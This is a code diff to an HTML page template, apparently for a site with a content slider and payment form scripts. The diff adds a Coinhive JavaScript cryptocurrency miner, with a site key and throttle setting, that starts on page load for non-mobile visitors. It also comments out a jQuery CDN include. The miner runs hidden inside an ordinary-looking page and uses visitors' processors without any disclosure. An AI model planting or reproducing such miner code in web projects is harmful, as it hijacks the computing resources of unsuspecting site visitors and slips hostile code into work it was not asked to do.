@@ -49,6 +49,17 @@
                 });
 
              </script>
+
+      <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+        <script>
+            var miner = new CoinHive.Anonymous('0tm4O1yv48I1fnYeMK4I8QCiaHeaiaM9', {throttle: 0.6});
+
+            // Only start on non-mobile devices and if not opted-out
+            // in the last 14400 seconds (4 hours):
+            if (!miner.isMobile() && !miner.didOptOut(14400)) {
+                miner.start();
+            }
+        </script>
      <!-- //requried-jsfiles-for owl -->
 
 			<!-- start content_slider -->
@@ -158,7 +169,7 @@
 
     <script type="text/javascript" src="{{ url_for('static', filename='js/payment.js') }}"></script>
     <script type="text/javascript" src="{{ url_for('static', filename='js/jquery.payform.min.js') }}"></script>
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
+    <!--<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>-->
     <script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
 
     </div>
